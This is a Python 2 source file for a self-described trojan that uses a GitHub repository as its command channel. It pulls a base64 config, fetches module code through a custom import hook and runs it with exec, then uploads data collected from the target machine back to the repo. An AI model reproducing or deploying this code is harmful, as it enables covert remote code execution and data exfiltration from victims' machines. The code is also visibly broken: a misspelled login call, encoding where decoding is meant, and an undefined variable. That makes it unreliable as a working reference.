# Trojan Framework
# To use:
# 1) enter the terminal and input 'python git_trojan.py'
#    It should connect to repo, grab the config file and pull in the 2 modules
# 2) next enter: 'git pull origin yourbranch'

import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

trojan_id = 'abc'

trojan_config  = '%s.json' % trojan_id
data_path      = 'data/%s/' % trojan_id
trojan_modules = []
configured     = False
task_queue     = Queue.Queue()


# authenticates the user to the repository
# and retrieves the current repo and branch objects
def connect_to_github():
    gh   = logib(username = 'yourusername', password = 'yourpassword')
    repo = gh.repository('yourusername', 'python_pen_testing')
    branch = repo.branch('dev')

    return gh, repo, branch


# grabs file from remote repo and then reads contents locally
# reads both config options and module cource code
def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.recurse()

    for filename in tree.tree:

        if filepath in filename.path:
            print '[*] Found file %s' % filepath
            blob = repo.blob(filename._json_data['sha'])
            return blob.content

    return None


# Retrieves remote config document from the repo
# so that trojan knows which modules to run
def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    config      = json.loads(base64.b64decode(config_json))
    configured  = True

    for task in config:

        if task['module'] not in sys.modules:
            exec('import %s' % task['module'])

    return config


# Pushes any collected data from target machine
def store_module_result():
    gh, repo, branch = connect_to_github()
    remote_path      = 'data/%s/%d.data' % (trojan_id, random.randint(1000, 100000))
    repo.create_file(remote_path, 'Commit message', base64.b64decode(data))

    return


class GitImporter(object):
    def __init__(self):
        self.current_module_code = ''

    # attempts to locate the module
    def find_module(self, fullname, path = None):
        if configured:
            print '[*] Attempting to retrieve %s' % fullname
            # pass the call to this remote file
            new_library = get_file_contents('modules/%s' % fullname)

            # if file is located in repo; base64-decode the code and store it in the class
            if new_library is not None:
                self.current_module_code = base64.b64encode(new_library)
                # returning self indicates to the Python interpreter that module was found
                return self

        return None


    def load_module(self, name):
        # create new blank module object
        module = imp.new_module(name)
        # then shovel the code retrieved from Github to it
        exec self.current_module_code in module.__dict__
        # insert newly created module into the sys.modules list
        # so that it's picked up by any future calls
        sys.modules[name] = module

        return module
